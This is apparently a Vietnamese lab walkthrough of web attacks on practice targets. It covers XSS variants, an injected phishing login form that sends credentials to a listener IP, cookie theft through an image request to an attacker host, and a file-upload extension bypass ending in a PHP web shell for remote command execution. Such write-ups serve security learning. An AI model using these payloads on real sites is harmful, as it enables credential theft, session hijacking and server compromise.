# Reflected XSS

![Screenshot 2025-05-09 012554](https://github.com/user-attachments/assets/a9bf5e3b-80e3-4c0c-9469-858fe8a31364)

![Screenshot 2025-05-09 013154](https://github.com/user-attachments/assets/d315fd9f-8b40-4742-bebb-1673aa5f4f35)

> <script>alert('heloooo')</script>

![Screenshot 2025-05-09 013237](https://github.com/user-attachments/assets/b7cf1b2b-1be1-42be-a64b-8dd5a693aee3)

![image](https://github.com/user-attachments/assets/3cf85edc-c839-4f7d-a543-c4cfa3fcd176)

# Stored XSS cũng giống 

Xuất hiện mỗi lần bạn mở lại trang (mà bạn không cần gửi lại dữ liệu từ input hay URL) 

# DOM XSS

![image](https://github.com/user-attachments/assets/10427616-f046-4fa7-931e-06e663b051d6)

Lần này payload không hoạt động, vì payload được gán thẳng vào innerHTML

![image](https://github.com/user-attachments/assets/82bc8f55-fa28-444a-aaa3-77026b2a06fb)

Có lẻ innerHTML không chạy các thẻ <script> nhưng <img thì được

Ta sẽ gửi một payload như sau 

> <img src="" onerror="alert('aaaa')>

khi ảnh không được tải lên thì sự kiện onerror sẽ thực thi và khi đó

![image](https://github.com/user-attachments/assets/3a98aa17-0013-4485-b1ce-11f96f4475be)

# Phisinggg

![Screenshot 2025-05-09 142539](https://github.com/user-attachments/assets/9523ba51-a53f-4500-adf7-ba65a032a4fc)

Nó cho phép ta nhập vào 1 url hình ảnh vào hiển thị chúng 

![Screenshot 2025-05-09 143254](https://github.com/user-attachments/assets/43d153eb-ee6e-43d7-b98c-2bc5937a1e58)
![Screenshot 2025-05-09 143349](https://github.com/user-attachments/assets/3fd6f1d2-26e7-487e-8cf5-55cab3cdf3ef)

Tiếp theo tôi sẽ tiêm vào một form đăng nhập

![Screenshot 2025-05-09 144552](https://github.com/user-attachments/assets/ce5847b0-92c3-4ec4-9601-3e6b61436cf0)

Tiếp theo tôi chuẩn bị mã XSS thử nghiệm trên biểu mẫu dễ bị tấn công trên, tôi sử dụng hàm trong javascript là document.write() nó có chức năng ghi nội dung trực tiếp ra trang html.

``` document.write('<h3>Please login to continue</h3><form action=http://10.10.15.205><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form><script>document.getElementById('urlform')?.remove()</script><!-- ```

10.10.15.205 sẽ là IP của máy mà chúng ta dùng để lắng nghe thông tin của nạn nhân

Ta được 1 form đăng nhập như này

![image](https://github.com/user-attachments/assets/d656c6e6-0ad3-4f17-a89e-e42d2683fde3)

Bây giờ ta phải làm sao để khi nạn nhân đăng nhập nó sẽ chuyển hướng đến giao diện nhập url ban đầu

![image](https://github.com/user-attachments/assets/d21c5e33-5763-4a31-99db-d3c0c69a97e7)

Ta tạo 1 thư mục tạm vào chèn đoạn mã sao vào file index.php

![image](https://github.com/user-attachments/assets/9f5f9acf-e211-4f7d-9699-4a016774934f)


Bây giờ chúng ta khởi động máy chủ php để lắng nghe, có thể sử dụng thay cho netcat

> sudo php -S 0.0.0.0:80

![image](https://github.com/user-attachments/assets/8b5996ef-2180-47a4-9f3c-7391426002e4)

Ta được thông tin của nạn nhân, Ví dụ nếu trang web hackthebox.com có lỗi tương tự thì ta sẽ có được tài khoảng htb của nạn nhân

# Chiếm đoạt phiên

![Screenshot 2025-05-13 203851](https://github.com/user-attachments/assets/d00f94c8-c17f-45c8-85b5-c9e7628590ff)


- index.js

<pre lang="markdown"> ```javascript new Image().src='http://OUR_IP/index.php?c='+document.cookie ``` </pre>

- chèn mã sau vào lỗ hổng XSS tìm được

<pre lang="markdown"> ```<script src=http://OUR_IP/script.js></script> ``` </pre>

- Gửi nó vào trường đầu vào dễ bị tấn công và ta sẽ nhận được lệnh gọi đến máy chủ với giá trị cookie
- Nhưng có nhiều cookie ta có thể không biết giá trị cookie nào thuộc về tiêu đề cookie nào, đây là tập lệnh php để chia chúng thành dòng mới và ghi chúng vào một tệp

![Screenshot 2025-05-13 203809](https://github.com/user-attachments/assets/5611bda4-23de-4285-be14-6db5ea04aaf4)

Ta nên bật trình lắng nghe trên VM bằng netcat hoac bằng php

Thêm vào 1 dòng nano index.php và đổ đoạn code bên trên vào trước khi khởi động trình lắng nghe

![Screenshot 2025-05-13 204601](https://github.com/user-attachments/assets/ceb8229f-e22a-4f9b-974d-bf9f29e679cb)


Khi nạn nhân đăng nhập vào ta sẽ nhận được cookie của người đó

![Screenshot 2025-05-13 204128](https://github.com/user-attachments/assets/06963a52-089a-49be-9948-21e5fb761bac)

# File Upload

![Screenshot 2025-05-15 151930](https://github.com/user-attachments/assets/d8bb7d85-43b5-460d-87cb-a9f071d52047)

- Sau khi tôi gửi 1 ảnh con mèo nó hiện lên trang web của tôi, tôi nghĩ server sử dụng 1 thư viện nào đó để xử lý dữ liệu vào tạo hình ảnh hiển thị ra cho tôi

![Screenshot 2025-05-15 151714](https://github.com/user-attachments/assets/88d7074c-c93a-4261-ba5f-14b43a21575b)

- Ta thấy ta chỉ được gửi ảnh với phần extension là .jpg .jpef .png

- Ý tưởng là tôi tạo 1 file ảnh đọc hại .jpg nhưng thực chất nội dung là 1 file SVG dạng XML, server có thể xử lý và hiện thị ra nội dung

![Screenshot 2025-05-15 152130](https://github.com/user-attachments/assets/cb05fe81-3861-44af-baa5-9ed4e773eceb)

![Screenshot 2025-05-15 152928](https://github.com/user-attachments/assets/4ac59f2a-9da4-4c0d-a616-bc01b79091ea)

![Screenshot 2025-05-15 153006](https://github.com/user-attachments/assets/a997830b-2baa-417a-831f-aa091e02c13c)

- Sau khi giải mã tôi nhận thấy sau khi file để gửi lên sẽ được lưu trữ tại ```/user_feedback_submissions/``` đây là thứ tôi cần :))
- Phân tích src tôi thấy sau khi file gửi lên sẽ được lưu vào tệp lưu trữ với 1 tên mới

![Screenshot 2025-05-15 153515](https://github.com/user-attachments/assets/6a64b4b4-61f3-4b93-86ca-13a36b02b991)

- Hàm date('ymd') tạo ra ngày tháng năm hiện tại theo định dạng năm-tháng-ngày

![Screenshot 2025-05-15 154027](https://github.com/user-attachments/assets/e268744d-7d99-4c83-8f05-25b8d9dbcd14)

- Tên file mới sẽ có dạng 250515_shellllll.jpg

- Bây giờ ta đã có file lưu trữ, vậy làm sao ta có thể thực thi lệnh từ xa để lấy flag tại thư mục /
- Tôi tiếp tục thêm đoạn mã sau vào file shellllll.jpg của tôi
![Screenshot 2025-05-15 155218](https://github.com/user-attachments/assets/ca556fcc-acfe-4281-98aa-d53a46bf4326)
-Tôi vào đường dẫn lưu trữ file và thấy payload của tôi nhưng nó khong được thực thi
![Screenshot 2025-05-15 155305](https://github.com/user-attachments/assets/8a123717-75a9-4428-a177-cffd4266bd94)

- Vậy để thực thi được tôi cần phải thay đổi extension của tôi thành .php nhưng vẫn đảm bảo extension cuối vẫn là .jpg
- Nhưng
  
![Screenshot 2025-05-15 155643](https://github.com/user-attachments/assets/63472db5-d6c1-40c6-9c74-baa723a87429)

- Lí do là tôi đã bị chặn các đuôi .php .phps .phtml

![Screenshot 2025-05-15 155742](https://github.com/user-attachments/assets/a7e4b08a-1178-4f7f-a366-e678038f1796)

- Giải pháp là tôi đã thay thành .phar.jpg
  
- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt

- Và khi tôi vào đường dẫn của file lưu trữ tôi thấy payload của tôi đã được thực thi

![Screenshot 2025-05-15 155927](https://github.com/user-attachments/assets/7033912a-0e09-48ee-8cd9-5a39f3e359e7)

- Tuyết vời , bây giờ tôi chỉ cần chèn vào 1 payload đơn giản có thể RCE

- ```<?php system($_GET["cmd"]); ?>```
  
![Screenshot 2025-05-15 160542](https://github.com/user-attachments/assets/47697880-9848-453b-8022-d0be3e7e0c0c)
































